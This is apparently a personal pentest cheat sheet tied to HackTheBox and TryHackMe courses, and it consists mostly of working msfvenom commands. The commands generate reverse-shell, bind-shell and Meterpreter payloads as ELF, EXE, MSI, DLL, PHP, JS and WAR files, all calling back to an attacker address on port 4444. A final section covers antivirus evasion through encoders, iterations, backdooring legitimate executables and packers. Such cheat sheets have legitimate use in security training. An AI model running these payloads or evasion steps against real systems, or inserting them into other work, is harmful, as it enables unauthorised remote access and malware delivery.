# 🐍 msfvenom 🐍

[![shells_and_payloads](../../../../_badges/htb/shells_and_payloads.svg)](https://academy.hackthebox.com/course/preview/shells--payloads)
[![fileuploadattacks](../../../../_badges/htb/fileuploadattacks.svg)](https://academy.hackthebox.com/course/preview/file-upload-attacks)
[![introtoshells](../../../../_badges/thmp/introtoshells.svg)](https://tryhackme.com/room/introtoshells)
[![metasploitexploitation](../../../../_badges/thmp/metasploitexploitation.svg)](https://tryhackme.com/room/metasploitexploitation)

<div class="row row-cols-lg-2"><div>

msfvenom is a tool of the [metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md) framework to generate payloads for reverse shells. We can customize payloads according to:

* 🎠 the program executing the payload <small>(PHP, python...)</small>
* 🏡 the target operating system
* 🛡️ the presence and configuration of a firewall
* 🔫️ the presence and configuration of an antivirus
* ...

```ps
$ msfvenom --list payloads
$ msfvenom --list payloads | grep meterpreter
```
</div><div>

msfvenom is often used with the [msfconsole](/cybersecurity/red-team/tools/frameworks/metasploit/_files/msf_handler.md) to catch them and pop a meterpreter shell <small>(see Metasploit framework, in short, an upgraded shell)</small>.

Metasploit separated **staged** payloads from **inline** payloads. The former is involving two steps: a simple payload <small>(called stage/stager)</small> is sent, which then request the rest of the payload. They are mainly used when there is a restriction on the size of the payload.

In Metasploit, the `_` is replaced with a `/` for staged payloads.

* `php/meterpreter_reverse_tcp`: inline/single
* `php/meterpreter/reverse_tcp`: staged
</div></div>

<hr class="sep-both">

## 🐸 Common options 🐸

<div class="row row-cols-lg-2"><div>

**-p** to define the payload to use.

```ps
$ msfvenom -p cmd/unix/reverse_netcat [...]
```

**LHOST/LPORT** to define where the target will connect back.

```ps
$ msfvenom [...] LHOST=tun0 LPORT=4444
```

**-f** to define the format of the output. For instance, raw code.

```ps
$ msfvenom [...] -f raw
$ msfvenom [...] R # same for -f RAW
```
</div><div>

**-e** to define the encoding. It's mainly used to bypass firewall or reduce the size of the payload.

```ps
$ msfvenom [...] -e php/base64
```
</div></div>

<hr class="sep-both">

## 📌 Some payloads 📌

All examples are asking the target to connect back to `tun0` IP at the port `4444`.

<div class="row row-cols-md-2 mt-3"><div>

* **Linux** (.elf / ...)

```bash!
# execute /bin/bash -p
$ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
# Generate a .elf opening a reverse shell (TCP)
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
# Output a command (RAW) opening a reverse shell with netcat
$ msfvenom -p cmd/unix/reverse_netcat LHOST=tun0 LPORT=4444 -f raw
```

* **Windows** (.exe / .msi / ...)

```bash!
# Generate a .exe opening a reverse shell (TCP)
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
# Generate a malicious installer (msi)
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi -o shell.msi
# Generate a malicious dynamic library (DLL)
$ msfvenom -p windows/x64/exec cmd='<some command>' -f dll -o malicious.dll
$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o malicious.dll
# Meterpreter - use the same payload in multi/handler
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o shell.exe LPORT=4444
```
</div><div>

* **Node.js**

```bash
# Generate a .js opening a reverse shell (TCP)
$ msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4444 -o shell.js
```

* **PHP**

```bash
# very unstable shell, not recommended
$ msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -o revshell.php
# meterpreter
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o revshell.php
```

* **Tomcat**

```bash
# works with Tomcat 7.8
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o revshell.war
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Payload Encoding: make the payload comptabible with different architectures and help with antivirus evasion.

* Shikata Ga Nai (SGN): good but still detected by modern antivirus. `-e x86/shikata_ga_nai`
* Use iterations to make it harder to detect: `-i 10`
* Password-protected archives are an additional antivirus evasion technique
* backdoored executable: use executable templates to hide the code
* Packers are also an alternative: [polypack](https://jon.oberheide.org/files/woot09-polypack.pdf)
</div><div>

Other options:

* `-a x86`: explicit architecture
* `--platform windows`: explicit platform
* `-k`: with backdoored executable, the original executable still runs as it was. If started from a terminal, a new terminal will (still) pop.
* `-x xxx.exe`
* `-o xxx.exe`

Test on Virus Total: `msf-virustotal -k <API key> -f xxx.exe`
</div></div>